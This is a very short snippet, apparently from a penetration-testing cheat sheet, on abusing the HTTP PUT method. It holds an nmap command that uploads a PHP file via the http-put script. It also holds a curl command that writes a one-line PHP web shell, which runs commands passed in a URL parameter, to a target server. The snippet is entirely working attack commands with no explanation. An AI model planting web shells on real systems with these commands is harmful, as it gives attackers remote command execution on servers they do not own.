
### HTTP PUT
`
```
nmap -p 80 192.168.1.103 --script http-put --script-args http-put.url='/dav/nmap.php',http-put.file='/root/Desktop/nmap.php'

curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
```